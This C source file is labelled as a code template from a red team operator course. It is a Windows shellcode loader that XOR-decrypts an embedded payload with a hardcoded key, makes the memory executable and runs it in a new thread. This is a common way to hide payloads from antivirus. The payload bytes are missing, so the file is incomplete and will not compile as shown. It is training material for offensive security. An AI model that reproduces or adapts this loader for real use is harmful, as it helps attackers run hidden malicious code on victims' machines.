/*

 Red Team Operator course code template
 payload encryption with XOR
 
 author: reenz0h (twitter: @sektor7net)

*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	unsigned char calc_payload[] = 
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = "mysecretkeee";

	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt (DeXOR) the payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}
